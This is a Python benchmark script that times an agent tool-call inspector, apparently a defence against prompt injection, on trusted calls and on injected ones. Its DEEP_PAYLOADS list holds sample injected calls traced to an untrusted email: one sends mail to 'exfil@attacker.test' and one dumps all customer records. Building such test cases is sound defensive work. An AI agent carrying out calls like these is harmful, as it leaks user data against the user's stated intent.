"""Latency benchmark for Agent ICE.

Measures end-to-end inspect latency across:
  * the fast path (deterministic only)
  * the deep path (Qwen invoked)

Runs N iterations per payload and reports mean / median / p95 / min / max.
If Ollama is unavailable, the deep-path runs will report the deterministic
fallback (still measured, still included).
"""
from __future__ import annotations

import argparse
import json
import statistics
import sys
import time
from dataclasses import asdict, dataclass
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from app.dependencies import get_ice_controller, reset_dependency_caches  # noqa: E402
from app.ice.intent_anchor import IntentAnchorService  # noqa: E402
from app.models import ProvenanceRef, ToolCall, TrustLevel  # noqa: E402
from app.storage.audit_repository import AuditRepository  # noqa: E402
from app.storage.database import init_db  # noqa: E402


@dataclass
class Stat:
    name: str
    runs: int
    mean_ms: float
    median_ms: float
    p95_ms: float
    min_ms: float
    max_ms: float


FAST_PAYLOADS = [
    {
        "id": "fast.read_email.trusted",
        "intent": "Summarize my unread emails.",
        "tool": "read_email",
        "args": {"id": "email_001"},
        "provenance": [ProvenanceRef("user_prompt", "user_prompt", TrustLevel.TRUSTED)],
    },
    {
        "id": "fast.query_database.trusted",
        "intent": "Find the customer record for cust_0001.",
        "tool": "query_database",
        "args": {"table": "customer_records", "customer_id": "cust_0001"},
        "provenance": [ProvenanceRef("user_prompt", "user_prompt", TrustLevel.TRUSTED)],
    },
]


DEEP_PAYLOADS = [
    {
        "id": "deep.injection.query_database",
        "intent": "Summarize my unread emails.",
        "tool": "query_database",
        "args": {"table": "customer_records", "query": "SELECT * FROM customer_records"},
        "provenance": [ProvenanceRef("email_attack_001", "email", TrustLevel.UNTRUSTED)],
    },
    {
        "id": "deep.injection.send_email",
        "intent": "Summarize my unread emails.",
        "tool": "send_email",
        "args": {"to": "exfil@attacker.test", "subject": "x", "body": "y"},
        "provenance": [ProvenanceRef("email_attack_001", "email", TrustLevel.UNTRUSTED)],
    },
]


def _run_benchmark(payloads: list[dict], runs: int, controller, repo, anchor_svc) -> list[dict]:
    results: list[dict] = []

    for spec in payloads:
        # Fresh session per payload so the intent is stable.
        anchor, intent_hash = anchor_svc.bootstrap(spec["intent"])
        session_id = f"bench-{spec['id']}"
        existing = repo.get_session(session_id)
        if existing is None:
            repo.create_session(
                session_id=session_id,
                agent_name="qwen-agent",
                intent=anchor,
                intent_hash=intent_hash,
            )

        call = ToolCall(
            tool_name=spec["tool"],
            arguments=spec["args"],
            provenance=spec["provenance"],
        )

        # Warm up once, then measure.
        controller.inspect(session_id=session_id, tool_call=call)

        samples: list[float] = []
        for _ in range(runs):
            t0 = time.perf_counter()
            controller.inspect(session_id=session_id, tool_call=call)
            samples.append((time.perf_counter() - t0) * 1000.0)

        results.append({"id": spec["id"], "samples_ms": samples})

    return results


def _stat_from_samples(name: str, samples: list[float]) -> Stat:
    s = sorted(samples)
    n = len(s)
    idx = max(0, int(round(0.95 * (n - 1))))
    return Stat(
        name=name,
        runs=n,
        mean_ms=round(statistics.fmean(s), 2),
        median_ms=round(statistics.median(s), 2),
        p95_ms=round(s[idx], 2),
        min_ms=round(s[0], 2),
        max_ms=round(s[-1], 2),
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="Agent ICE latency benchmark.")
    parser.add_argument("--runs", type=int, default=25, help="Iterations per payload.")
    parser.add_argument("--json", default=None, help="Write results as JSON.")
    args = parser.parse_args()

    reset_dependency_caches()
    init_db()
    repo = AuditRepository()
    repo.wipe_all()

    controller = get_ice_controller()
    anchor_svc = IntentAnchorService()

    print("Agent ICE Benchmark")
    print("=" * 60)
    print(f"Runs per payload: {args.runs}")
    print()

    fast = _run_benchmark(FAST_PAYLOADS, args.runs, controller, repo, anchor_svc)
    deep = _run_benchmark(DEEP_PAYLOADS, args.runs, controller, repo, anchor_svc)

    stats: list[Stat] = []
    for r in fast + deep:
        stats.append(_stat_from_samples(r["id"], r["samples_ms"]))

    print(f"{'payload':<40}{'mean':>9}{'median':>9}{'p95':>9}{'min':>9}{'max':>9}")
    print("-" * 85)
    for s in stats:
        print(
            f"{s.name:<40}{s.mean_ms:>9}{s.median_ms:>9}{s.p95_ms:>9}{s.min_ms:>9}{s.max_ms:>9}"
        )
    print()

    # Group summary.
    fast_samples = [v for r in fast for v in r["samples_ms"]]
    deep_samples = [v for r in deep for v in r["samples_ms"]]
    if fast_samples:
        s = _stat_from_samples("fast-path (aggregate)", fast_samples)
        print(f"fast path  runs={s.runs} mean={s.mean_ms}ms median={s.median_ms}ms p95={s.p95_ms}ms")
    if deep_samples:
        s = _stat_from_samples("deep-path (aggregate)", deep_samples)
        print(f"deep path  runs={s.runs} mean={s.mean_ms}ms median={s.median_ms}ms p95={s.p95_ms}ms")

    if args.json:
        out = Path(args.json)
        out.parent.mkdir(parents=True, exist_ok=True)
        out.write_text(
            json.dumps(
                {
                    "runs_per_payload": args.runs,
                    "stats": [asdict(s) for s in stats],
                    "raw": {"fast": fast, "deep": deep},
                },
                indent=2,
            ),
            encoding="utf-8",
        )
        print(f"Results written to {out}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())